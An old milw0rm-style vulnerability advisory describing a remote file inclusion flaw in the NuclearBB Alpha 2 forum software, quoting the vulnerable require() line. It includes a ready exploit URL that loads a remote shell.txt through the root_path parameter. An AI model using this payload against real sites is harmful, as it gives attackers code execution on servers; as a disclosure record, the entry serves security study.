@@ -1,0 +1,18 @@
+Vuln Product: NuclearBB Alpha 2
+Vendor: http://www.nuclearbb.com/
+Vulnerability Type: Remote File Inclusion
+Autor: Infection
+Team: Rootshell Security Team
+Vulnerable file: /NuclearBB/tasks/send_queued_emails.php
+Exploit URL: http://localhost/NuclearBB/tasks/send_queued_emails.php?root_path=http://localhost/shell.txt?
+Method: get
+Register_globals: On
+Vulnerable variable: root_path
+Line number: 14
+Lines:
+----------------------------------------------
+require("$root_path/inc/functions_email.php");
+$mail = new email;
+----------------------------------------------
+
+# milw0rm.com [2007-09-11]
